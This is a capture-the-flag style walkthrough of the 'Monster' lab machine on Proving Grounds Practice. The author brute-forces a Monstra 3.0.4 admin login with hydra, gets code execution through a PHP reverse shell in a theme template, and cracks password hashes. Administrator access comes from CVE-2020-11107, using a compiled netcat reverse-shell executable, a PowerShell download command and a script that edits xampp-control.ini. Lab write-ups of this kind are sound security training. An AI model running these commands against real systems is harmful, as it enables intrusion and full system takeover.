---
layout: post
title: "Monster - Proving Grounds Practice"
summary: "Directory Brute Force → Monstra 3.0.4 → RCE → Monstra 3.0.4 users.table.xml decryption → C:\\xamp writeable by user → CVE-2020-11107 → malicious executable using C code and i686-w64-mingw32-gcc → Administrator"
---

# Monster - Proving Grounds Practice

## Enumeration
### Nmap
Initial nmap scan revealed SMB, MySQL and HTTP ports were open.

<img width="937" height="714" alt="00nmap" src="https://github.com/user-attachments/assets/496e6fd6-565e-4597-bacd-a9102e847d6e" />

### Website
Initial website was static website.

<img width="1116" height="646" alt="01static" src="https://github.com/user-attachments/assets/d4728704-f592-45e9-84c5-d63912d981e0" />

So I applied directory brute force and found `/blog` endpoint.

<img width="953" height="607" alt="02blog" src="https://github.com/user-attachments/assets/5e899959-ac86-42d5-88c5-6ba33c238a1b" />

The website was redirecting us to `monster.pg` domain.

<img width="669" height="704" alt="03admin" src="https://github.com/user-attachments/assets/5f0ee5bd-0b3f-4d71-a285-6b79ecab0c58" />

So I added it to `/etc/hosts` file.

<img width="797" height="246" alt="04hosts" src="https://github.com/user-attachments/assets/41206858-3851-495a-acd3-933410de643d" />

The blog website was `Monstra 3.0.4`

<img width="1113" height="572" alt="05sus" src="https://github.com/user-attachments/assets/0151ed32-dca6-484c-acd7-9d27487b6478" />

## Exploitation
### Brute Force
At first I tried default credentials but non of them worked. Then I used cewl to create a wordlist.
```bash
cewl http://monster.pg/ > passlist
```

And then I applied hydra brute force and found password for admin user.
```bash
hydra -l admin -P passlist monster.pg http-post-form '/blog/admin/:login=^USER^&password=^PASS^&login_submit=Log+In:F=Wrong' -I -f -V
```

<img width="1118" height="154" alt="07foundit" src="https://github.com/user-attachments/assets/ec408515-491a-41cd-8237-bdb8f11bcc62" />

### Monstra 3.0.4 RCE
Later I found this ([https://github.com/monstra-cms/monstra/issues/470](https://github.com/monstra-cms/monstra/issues/470)) github repository which explain how to abuse this version to get a reverse shell.
1. Log into the panel.
2. Go to "/monstra-3.0.4/admin/index.php?id=themes&action=edit_template&filename=blog"
3. Click edit Blog
4. Insert payload easy-simple-php-webshell.php
5. Reload page review code excution

So I used [ivan-sincek/php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell) to create a reverse shell and updated IP and port values.

<img width="1120" height="664" alt="08ivansincek" src="https://github.com/user-attachments/assets/8454572c-08d8-4bd6-8534-c8ac118be77d" />

Later, I visited the created page `blog` which is located at `/blog/blog` and got a reverse shell.

<img width="1086" height="888" alt="09local" src="https://github.com/user-attachments/assets/c0d90a56-3b4d-4d79-b3d3-4dbe0cedd9f5" />

## Privilege Escalation
### users.table.xml decryption
At first I found `users.table.xml` file located at `C:\xampp\htdocs\blog\storage`.

<img width="1112" height="150" alt="10 0 userstablexml" src="https://github.com/user-attachments/assets/7d239636-1297-4b70-93af-f296890595f0" />

Then using an online purifier ([https://jsonformatter.org/xml-formatter](https://jsonformatter.org/xml-formatter)) I purified the XML output.

<img width="788" height="743" alt="10 1 purify userstablexml" src="https://github.com/user-attachments/assets/8c9eade0-759b-41b4-97b5-ec9650581f22" />

We already knew admin password but there was another user. While checking I found this post ([https://simpleinfoseccom.wordpress.com/2018/05/27/monstra-cms-3-0-4-unauthenticated-user-credential-exposure/](https://simpleinfoseccom.wordpress.com/2018/05/27/monstra-cms-3-0-4-unauthenticated-user-credential-exposure/))
which explain how passwords are stored in `users.table.xml` file.

To understand it even more I checked `Security.php` file under `C:\xampp\htdocs\blog\engine` and found encryption code.
```php
/**
* Encrypt password
*
*  <code>
*      $encrypt_password = Security::encryptPassword('password');
*  </code>
*
* @param string $password Password to encrypt
*/

public static function encryptPassword($password)
{
    return md5(md5(trim($password) . MONSTRA_PASSWORD_SALT));
}
```

It was simply concataneting password and salt then applying MD5 twice. So I checked `defines.php` file under `C:\xampp\htdocs\blog\boot` which showed salt value.
```php
/**
 * Set password salt
 */

define('MONSTRA_PASSWORD_SALT', 'YOUR_SALT_HERE');
```

So it was simply `YOUR_SALT_HERE`. I could now crack the passwords. I tried to crack it with `rockyou.txt` using `hashcat` with mode `2630` and it worked. I cracked it.

<img width="651" height="341" alt="14cracked" src="https://github.com/user-attachments/assets/1b2e08ee-f5e3-44b9-8485-9ec0e53986b5" />

However, it was not useful because I already got mike shell and it was mike's password.

<img width="1117" height="110" alt="15mike14" src="https://github.com/user-attachments/assets/8213e275-81c6-4ad5-a391-ffc8d7d87ee8" />

### CVE-2020-11107
An issue was discovered in XAMPP before 7.2.29, 7.3.x before 7.3.16 , and 7.4.x before 7.4.4 on Windows. An unprivileged user can change a .exe configuration in xampp-contol.ini for all users (including admins) to enable arbitrary command execution.

So later, I executed `WinPEAS.exe` and found I had write privileges over `C:\xampp`. Some research revealed there was a CVE assigned to it.

<img width="1114" height="429" alt="16suspicious" src="https://github.com/user-attachments/assets/dc1c632c-8d85-41de-a78a-1e112401d696" />

I found this repo ([Mohnad-AL-saif/Mohnad-AL-saif-CVE-2020-11107-XAMPP-Local-Privilege-Escalation](https://github.com/Mohnad-AL-saif/Mohnad-AL-saif-CVE-2020-11107-XAMPP-Local-Privilege-Escalation))
which explains this exploitation in detail.

At first I checked the version using `type C:\xampp\properties.ini`.

<img width="514" height="479" alt="ver" src="https://github.com/user-attachments/assets/25989b27-8b34-46e0-9012-2fc43ead5668" />

It was vulnerable. So I created a malicious executable using `C` and `i686-w64-mingw32-gcc` after transferring nc64.exe file.
```c
#include <stdlib.h>

int main(void){
     system("C:\\ProgramData\\nc64.exe 192.168.45.216 445 -e cmd.exe");
    return 0;
} 
```
```bash
i686-w64-mingw32-gcc exp.c -l ws2_32 -o exp.exe
```

Then I created a temp folder using `mkdir C:\temp` and I transfered my malicious file to here using `powershell iwr http://192.168.45.216/exp.exe -outfile C:\temp\msf.exe`.

Then I created a powershell script to exploit this.
```ps
# CVE-2020-11107 PoC
$file = "C:\xampp\xampp-control.ini"
$find = ((Get-Content $file)[2] -Split "=")[1]
$replace = "C:\temp\msf.exe"
(Get-Content $file) -replace $find, $replace | Set-Content $file
```

Later I simply executed the ps1 payload using `powershell -ExecutionPolicy Bypass -File exp.ps1` and started waiting.

<img width="511" height="240" alt="20expps1" src="https://github.com/user-attachments/assets/ed6e9180-3f6d-472b-84f8-52fbf8327c97" />

After sometime I got administrator shell.

<img width="752" height="742" alt="21root" src="https://github.com/user-attachments/assets/85490ca4-9ed0-4279-8404-535cc638bb93" />

